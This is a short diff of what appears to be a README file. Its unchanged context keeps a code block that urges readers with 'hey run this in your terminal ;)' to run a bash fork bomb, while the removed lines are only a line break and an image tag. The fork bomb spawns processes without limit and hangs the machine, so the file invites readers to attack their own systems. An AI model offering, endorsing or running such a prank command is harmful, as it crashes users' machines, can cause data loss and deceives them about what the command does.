@@ -7,9 +7,3 @@
 # hey run this in your terminal ;)
 :() { :|: & }; :
 ```
-
-<br />
-
-<img src="./assets/994857348436865124.png"
-height="64px"
-/>
